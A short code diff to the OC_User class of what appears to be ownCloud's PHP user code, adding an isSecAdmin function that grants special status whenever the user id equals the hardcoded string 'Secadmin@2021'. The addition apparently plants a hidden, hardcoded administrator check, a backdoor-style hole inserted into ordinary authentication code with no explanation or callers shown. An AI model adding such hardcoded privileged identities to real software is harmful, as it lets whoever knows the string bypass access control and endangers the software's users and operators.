@@ -298,6 +298,10 @@ class OC_User {
 		return false;
 	}
 
+	public static function isSecAdmin($uid) {
+
+		return $uid == "Secadmin@2021";
+	}
 
 	/**
 	 * get the user id of the user currently logged in.
